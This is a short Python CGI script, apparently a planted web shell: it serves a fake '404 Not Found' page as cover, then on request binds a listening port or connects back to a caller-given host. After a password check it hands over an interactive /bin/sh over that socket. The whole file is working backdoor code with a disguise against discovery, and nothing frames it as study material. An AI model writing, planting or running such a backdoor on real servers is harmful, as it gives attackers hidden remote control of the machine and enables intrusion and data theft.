#!/usr/bin/python
# by amon (amon@nandynarwhals.org)

import cgi

import socket
import md5
import os
import subprocess

notfound = """
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /cgi/.gh was not found on this server.</p>
<hr>
</body></html>
"""

print "Content-type:text/html\r\n\r\n"
print notfound

form = cgi.FieldStorage()
if "r" not in form:
    exit()
r = int(form["r"].value.strip())
if "cb" not in form:
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serversocket.bind(("0.0.0.0", r))
    serversocket.listen(5)

    (clientsocket, address) = serversocket.accept()
else:
    cb = form["cb"].value
    clientsocket = socket.socket()
    clientsocket.connect((cb, r))

clientsocket.sendall("Breakfast Club?")
data = clientsocket.recv(20)
if md5.md5(data.strip()).hexdigest() == "7cacfc91586f53c403ebb263c05bc469":
    clientsocket.sendall("Judd Nelson?")
    os.dup2(clientsocket.fileno(), 0)
    os.dup2(clientsocket.fileno(), 1)
    os.dup2(clientsocket.fileno(), 2)
    p=subprocess.call(["/bin/sh","-i"])
